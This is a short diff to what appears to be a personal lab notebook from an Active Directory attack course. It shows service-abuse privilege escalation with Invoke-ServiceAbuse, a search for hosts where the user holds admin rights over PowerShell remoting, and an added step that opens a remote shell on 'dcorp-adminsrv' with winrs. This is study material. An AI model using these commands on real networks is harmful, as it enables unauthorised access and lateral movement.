@@ -150,3 +150,7 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student115' -Verbose
 Find-PSremotingLocalAdminAccess -verbose
 ```
 ![[Pasted image 20231018151010.png]]
+Connect to the machine found
+```powershell
+winrs -r:dcorp-adminsrv cmd
+```
